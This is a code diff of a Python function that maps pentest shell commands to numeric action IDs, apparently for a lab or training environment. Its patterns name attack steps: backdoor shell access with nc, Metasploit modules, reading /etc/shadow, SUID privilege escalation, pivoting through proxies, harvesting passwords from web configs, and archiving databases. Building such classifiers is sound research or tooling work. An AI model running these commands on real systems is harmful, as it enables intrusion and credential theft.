+    if re.fullmatch(r"nc -nv(?: -w \d+)? (?:\d{1,3}\.){3}\d{1,3} 1524", s):
+        return 606
+    if s.startswith("msfconsole ") and "rlogin_login" in s:
+        return 607
+    if s.startswith("msfconsole ") and "java_rmi_server" in s:
+        return 608
     # ============================================================
     # Post-exploitation
     # ============================================================
@@ -1478,5 +2322,70 @@ def extract_action_id_from_cmd(cmd: str) -> int:
         return 701
     if s == "id":
         return 702
-
+    if s == "ip route":
+        return 705
+    if s == "ss -tulnp":
+        return 706
+    if s == "netstat -tulnp":
+        return 707
+    if s == "cat /etc/passwd":
+        return 708
+    if s == "cat /etc/passwd | grep home":
+        return 709
+    if s == "ps aux":
+        return 710
+    if s == "env":
+        return 711
+    if s == "sudo -l":
+        return 712
+    if s == "ls -l /etc/sudoers":
+        return 713
+    if s.startswith("find / -perm -4000"):
+        return 714
+    if s == "nmap --interactive":
+        return 715
+    if s.startswith("find . -exec /bin/sh -p"):
+        return 716
+    if s == "cat /etc/shadow":
+        return 717
+    if s == "ls -la /etc/ssh":
+        return 718
+    if s == "cat /etc/crontab":
+        return 719
+    if s.startswith("msfconsole ") and "post/linux/gather/enum_system" in s:
+        return 730
+    if s.startswith("msfconsole ") and "post/linux/gather/enum_configs" in s:
+        return 731
+    if s.startswith("msfconsole ") and "post/linux/gather/enum_network" in s:
+        return 732
+    if s.startswith("msfconsole ") and "local_exploit_suggester" in s:
+        return 733
+    if s.startswith("msfconsole ") and "post/multi/manage/autoroute" in s:
+        return 760
+    if s.startswith("msfconsole ") and "auxiliary/server/socks_proxy" in s:
+        return 761
+    if s.startswith("proxychains nmap ") and "-st" in s and "-pn" in s:
+        return 762
+    if s.startswith("msfconsole ") and "portfwd add" in s:
+        return 763
+    if s.startswith("mysql ") and "-h 127.0.0.1" in s:
+        return 764
+    if s.startswith("mysqldump ") and "-h 127.0.0.1" in s:
+        return 765
+    if s.startswith("grep -r \"pass\" -ni /var/www"):
+        return 780
+    if s.startswith("grep -r \"db\" -ni /var/www"):
+        return 781
+    if s == "cat /var/www/dvwa/config/config.inc.php":
+        return 782
+    if s == "cat /etc/phpmyadmin/config-db.php":
+        return 783
+    if s == "cat /var/www/tikiwiki/db/local.php":
+        return 784
+    if "tar -cvf /tmp/mysql.tar" in s:
+        return 790
+    if "tar -cvf /tmp/pgsql.tar" in s:
+        return 791
+    if s.startswith("download "):
+        return 792
     return None
